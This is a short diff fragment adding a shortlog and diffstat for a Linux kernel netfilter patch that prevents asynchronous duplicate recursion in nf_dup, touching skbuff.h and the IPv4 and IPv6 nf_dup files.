+Zihan Xi (1):
+  netfilter: nf_dup: prevent asynchronous duplicate recursion
+
+ include/linux/skbuff.h           | 7 +++++++
+ net/ipv4/netfilter/nf_dup_ipv4.c | 3 ++-
+ net/ipv6/netfilter/nf_dup_ipv6.c | 3 ++-
+ 3 files changed, 11 insertions(+), 2 deletions(-)
+
 -- 
 2.43.0
+
